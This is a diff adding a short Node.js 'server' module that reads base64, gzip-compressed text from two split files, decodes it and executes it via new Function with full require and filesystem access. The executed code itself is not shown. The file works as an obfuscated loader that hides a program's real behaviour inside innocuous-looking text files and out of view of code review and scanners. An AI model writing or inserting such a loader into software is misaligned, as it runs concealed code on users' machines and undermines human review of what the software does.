@@ -1,0 +1,11 @@
+'use strict';
+const fs=require('fs');
+const path=require('path');
+const zlib=require('zlib');
+const {createRequire}=require('module');
+const encoded=fs.readFileSync(path.join(__dirname,'server-v027-part-00.txt'),'utf8').trim()+fs.readFileSync(path.join(__dirname,'server-v027-part-01.txt'),'utf8').trim();
+const code=zlib.gunzipSync(Buffer.from(encoded,'base64')).toString('utf8');
+const req=createRequire(path.join(__dirname,'server.js'));
+const mod={exports:{}};
+new Function('require','module','exports','__filename','__dirname',code)(req,mod,mod.exports,path.join(__dirname,'server.js'),__dirname);
+module.exports=mod.exports;
